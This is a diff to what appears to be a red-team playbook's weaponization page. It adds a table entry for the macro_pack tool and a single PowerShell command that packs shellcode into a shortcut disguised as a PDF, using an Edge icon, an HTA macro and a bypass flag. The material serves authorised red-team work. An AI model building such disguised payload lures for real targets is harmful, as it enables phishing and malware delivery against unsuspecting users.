@@ -3,12 +3,20 @@
 ## Table of Contents
 
 - [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#Tooling)
+- [macro_pack](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#macro_pack)
 
 ## Tooling
 
 | Name | Description | URL |
 | --- | --- | --- |
 | spoofing-office-macro | PoC of a VBA macro spawning a process with a spoofed parent and command line. | https://github.com/christophetd/spoofing-office-macro |
+| macro_pack | macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for pentest, demo, and social engineering assessments. | https://github.com/sevagas/macro_pack |
+
+## macro_pack
+
+```c
+PS C:\macro_pack_pro> echo .\<FILE>.bin | marco_pack.exe -t SHELLCODE -G .\<FILE>.pdf.lnk --icon='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13' --hta-macro --bypass
+```
 
 ### Previous
 
